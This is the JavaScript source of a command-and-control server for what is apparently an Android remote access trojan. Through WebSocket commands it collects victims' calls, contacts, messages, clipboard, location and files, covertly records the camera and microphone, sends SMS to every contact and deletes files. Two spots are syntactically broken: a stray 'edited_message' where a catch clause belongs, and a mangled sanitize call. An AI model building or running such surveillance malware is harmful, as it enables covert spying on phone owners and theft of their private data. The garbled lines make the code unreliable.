const express = require('express');
const webSocket = require('ws');
const http = require('http');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const helmet = require('helmet');
const cors = require('cors');
const winston = require('winston');
const sanitize = require('sanitize-html');
const fs = require('fs');
const path = require('path');
const mime = require('mime-types');

// Logger setup
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' }),
        new winston.transports.Console()
    ]
});

const address = 'https://www.google.com';
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appClients = new Map();

// Multer disk storage
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, `${Date.now()}-${sanitizeInput(file.originalname)}`)
});
const upload = multer({ storage });
app.use(helmet());
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '1mb' }));
app.use(express.static('public'));

// Command definitions
const commands = {
    calls: { wsCommand: 'calls', params: [] },
    contacts: { wsCommand: 'contacts', params: [] },
    messages: { wsCommand: 'messages', params: [] },
    apps: { wsCommand: 'apps', params: [] },
    device_info: { wsCommand: 'device_info', params: [] },
    clipboard: { wsCommand: 'clipboard', params: [] },
    camera_main: { wsCommand: 'camera_main', params: [] },
    camera_selfie: { wsCommand: 'camera_selfie', params: [] },
    location: { wsCommand: 'location', params: [] },
    vibrate: { wsCommand: 'vibrate', params: [] },
    stop_audio: { wsCommand: 'stop_audio', params: [] },
    send_message: { wsCommand: 'send_message', params: ['number', 'message'] },
    send_message_to_all: { wsCommand: 'send_message_to_all', params: ['message'] },
    file: { wsCommand: 'file', params: ['path'] },
    delete_file: { wsCommand: 'delete_file', params: ['path'] },
    microphone: { wsCommand: 'microphone', params: ['duration'] },
    rec_camera_main: { wsCommand: 'rec_camera_main', params: ['duration'] },
    rec_camera_selfie: { wsCommand: 'rec_camera_selfie', params: ['duration'] },
    toast: { wsCommand: 'toast', params: ['message'] },
    show_notification: { wsCommand: 'show_notification', params: ['title', 'link'] },
    play_audio: { wsCommand: 'play_audio', params: ['link'] }
};

// Input validation
const validateParams = (command, params) => {
    const expectedParams = commands[command]?.params || [];
    for (const param of expectedParams) {
        if (!params[param]) {
            return { valid: false, error: `Missing parameter: ${param}` };
        }
        if (typeof params[param] !== 'string') {
            return { valid: false, error: `Invalid parameter type for ${param}` };
        }
        if (param === 'duration' && isNaN(parseInt(params[param]))) {
            return { valid: false, error: 'Duration must be a number' };
        }
    }
    return { valid: true };
};

// Sanitize input
const sanitizeInput = (input) => {
    return sanitize(input, {
        allowedTags: [],
        allowedAttributes: {}
    });
};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/devices', (req, res) => {
    try {
        const devices = Array.from(appClients.entries()).map(([uuid, value]) => ({
            uuid,
            model: sanitizeInput(value.model || 'Unknown'),
            battery: sanitizeInput(value.battery || 'Unknown'),
            version: sanitizeInput(value.version || 'Unknown'),
            brightness: sanitizeInput(value.brightness || 'Unknown'),
            provider: sanitizeInput(value.provider || 'Unknown')
        }));
        res.json({ status: 'success', devices });
        logger.info('Devices list requested');
    } catch (error) {
        logger.error(`Error fetching devices: ${error.message}`);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            throw new Error('No file uploaded');
        }
        const name = sanitizeInput(req.file.originalname);
        const model = sanitizeInput(req.headers.model || 'Unknown');
        const filename = req.file.filename;
        const filePath = path.join(uploadDir, filename);
        const stats = fs.statSync(filePath);
        logger.info(`File uploaded: ${name} (${filename}) from device ${model}`);
        res.json({ 
            status: 'success', 
            message: `File ${name} uploaded from device ${model}`,
            file: {
                name: name,
                filename: filename,
                size: stats.size,
                uploadedAt: stats.mtime
            }
        });
    } catch (error) {
        logger.error(`File upload error: ${error.message}`);
        res.status(400).json({ status: 'error', message: error.message });
    }
});

app.post('/uploadText', (req, res) => {
    try {
        if (!req.body.text) {
            throw new Error('No text provided');
        }
        const text = sanitizeInput(req.body.text);
        const model = sanitizeInput(req.headers.model || 'Unknown');
        const filename = `${Date.now()}-text.txt`;
        const filePath = path.join(uploadDir, filename);
        fs.writeFileSync(filePath, text);
        const stats = fs.statSync(filePath);
        logger.info(`Text uploaded from device ${model}`);
        res.json({ 
            status: 'success', 
            message: `Text received from device ${model}`,
            file: {
                name: 'text.txt',
                filename: filename,
                size: stats.size,
                uploadedAt: stats.mtime
            }
        });
    } catch (error) {
        logger.error(`Text upload error: ${error.message}`);
        res.status(400).json({ status: 'error', message: error.message });
    }
});

app.post('/uploadLocation', (req, res) => {
    try {
        if (!req.body.lat || !req.body.lon) {
            throw new Error('Missing latitude or longitude');
        }
        const lat = parseFloat(req.body.lat);
        const lon = parseFloat(req.body.lon);
        if (isNaN(lat) || isNaN(lon)) {
            throw new Error('Invalid latitude or longitude');
        }
        const model = sanitizeInput(req.headers.model || 'Unknown');
        logger.info(`Location uploaded from device ${model}`);
        res.json({ status: 'success', message: `Location received from device ${model}: Lat ${lat}, Lon ${lon}` });
    } catch (error) {
        logger.error(`Location upload error: ${error.message}`);
        res.status(400).json({ status: 'error', message: error.message });
    }
});

app.post('/executeCommand', (req, res) => {
    try {
        const { uuid, command, params = {} } = req.body;
        if (!uuid || !command) {
            throw new Error('Missing uuid or command');
        }
        if (!appClients.has(uuid)) {
            throw new Error('Device not found');
        }
        if (!commands[command]) {
            throw new Error('Invalid command');
        }

        const validation = validateParams(command, params);
        if (!validation.valid) {
            throw new Error(validation.error);
        }

        let wsCommand = commands[command].wsCommand;
        if (command === 'send_message') {
            wsCommand += `:${sanitizeInput(params.number)}/${sanitizeInput(params.message)}`;
        } else if (command === 'send_message_to_all') {
            wsCommand += `:${sanitizeInput(params.message)}`;
        } else if (command === 'file' || command === 'delete_file') {
            wsCommand += `:${sanitizeInput(params.path)}`;
        } else if (command === 'microphone' || command === 'rec_camera_main' || command === 'rec_camera_selfie') {
            wsCommand += `:${parseInt(params.duration)}`;
        } else if (command === 'toast') {
            wsCommand += `:${sanitizeInput(params.message)}`;
        } else if (command === 'show_notification') {
            wsCommand += `:${sanitizeInput(params.title)}/${sanitizeInput(params.link)}`;
        } else if (command === 'play_audio') {
            wsCommand += `:${sanitizeInput(params.link)}`;
        }

        let commandSent = false;
        appSocket.clients.forEach((ws) => {
            if (ws.uuid === uuid && ws.readyState === webSocket.OPEN) {
                ws.send(wsCommand);
                commandSent = true;
            }
        });

        if (!commandSent) {
            throw new Error('No active WebSocket connection for the device');
        }

        logger.info(`Command ${command} sent to device ${uuid}`);
        res.json({ status: 'success', message: 'Command sent, response will be sent via WebSocket' });
    } edited_message (error) {
        logger.error(`Command execution error: ${error.message}`);
        res.status(400).json({ status: 'error', message: error.message });
    }
});

app.get('/files', (req, res) => {
    try {
        const files = fs.readdirSync(uploadDir).map(filename => {
            const filePath = path.join(uploadDir, filename);
            const stats = fs.statSync(filePath);
            const mimeType = mime.lookup(filename) || 'application/octet-stream';
            return {
                filename,
                name: filename.split('-').slice(1).join('-'),
                size: stats.size,
                uploadedAt: stats.mtime,
                type: mimeType,
                isText: mimeType.startsWith('text/'),
                isImage: mimeType.startsWith('image/'),
                isAudio: mimeType.startsWith('audio/'),
                isVideo: mimeType.startsWith('video/')
            };
        });
        res.json({ status: 'success', files });
        logger.info('Files list requested');
    } catch (error) {
        logger.error(`Error listing files: ${error.message}`);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

app.get('/files/:filename', (req, res) => {
    try {
        const filename = sanitize.wpi sanitizeInput(req.params.filename);
        const filePath = path.join(uploadDir, filename);
        if (!fs.existsSync(filePath)) {
            throw new Error('File not found');
        }
        const mimeType = mime.lookup(filename) || 'application/octet-stream';
        if (mimeType.startsWith('text/')) {
            const content = fs.readFileSync(filePath, 'utf8');
            res.set('Content-Type', mimeType);
            res.send(content);
        } else if (mimeType.startsWith('image/') || mimeType.startsWith('audio/') || mimeType.startsWith('video/')) {
            res.set('Content-Type', mimeType);
            res.sendFile(filePath);
        } else {
            res.download(filePath, filename);
        }
        logger.info(`File served: ${filename}`);
    } catch (error) {
        logger.error(`Error serving file ${filename}: ${error.message}`);
        res.status(404).json({ status: 'error', message: 'File not found' });
    }
});

app.delete('/files/:filename', (req, res) => {
    try {
        const filename = sanitizeInput(req.params.filename);
        const filePath = path.join(uploadDir, filename);
        if (!fs.existsSync(filePath)) {
            throw new Error('File not found');
        }
        fs.unlinkSync(filePath);
        logger.info(`File deleted: ${filename}`);
        res.json({ status: 'success', message: `File ${filename} deleted` });
    } catch (error) {
        logger.error(`Error deleting file ${filename}: ${error.message}`);
        res.status(400).json({ status: 'error', message: error.message });
    }
});

appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = sanitizeInput(req.headers.model || 'Unknown');
        const battery = sanitizeInput(req.headers.battery || 'Unknown');
        const version = sanitizeInput(req.headers.version || 'Unknown');
        const brightness = sanitizeInput(req.headers.brightness || 'Unknown');
        const provider = sanitizeInput(req.headers.provider || 'Unknown');

        ws.uuid = uuid;
        appClients.set(uuid, { model, battery, version, brightness, provider });

        logger.info(`New device connected: ${model} (UUID: ${uuid})`);

        ws.on('close', () => {
            appClients.delete(ws.uuid);
            logger.info(`Device disconnected: ${model} (UUID: ${uuid})`);
        });

        ws.on('error', (error) => {
            logger.error(`WebSocket error for UUID ${uuid}: ${error.message}`);
        });
    } catch (error) {
        logger.error(`WebSocket connection error: ${error.message}`);
        ws.close();
    }
});

appSocket.on('error', (error) => {
    logger.error(`WebSocket server error: ${error.message}`);
});

setInterval(() => {
    try {
        appSocket.clients.forEach((ws) => {
            if (ws.readyState === webSocket.OPEN) {
                ws.send('ping');
            }
        });
        axios.get(address).catch(() => {});
    } catch (error) {
        logger.error(`Ping interval error: ${error.message}`);
    }
}, 5000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    logger.info(`Server running on port ${PORT}`);
});
